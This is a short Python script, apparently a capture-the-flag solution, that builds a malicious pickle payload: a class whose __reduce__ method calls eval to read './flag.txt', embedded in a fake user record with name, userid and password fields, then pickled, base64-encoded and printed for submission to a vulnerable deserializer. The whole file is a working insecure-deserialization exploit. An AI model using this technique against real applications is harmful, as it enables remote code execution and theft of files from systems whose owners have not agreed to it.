import pickle
import base64

class RCE:
    def __reduce__(self):
        return eval, ("open('./flag.txt').read()",)

info = {"name":RCE(), 'userid':'a', 'password':'a'}
payload = base64.b64encode(pickle.dumps(info)).decode()
print(payload)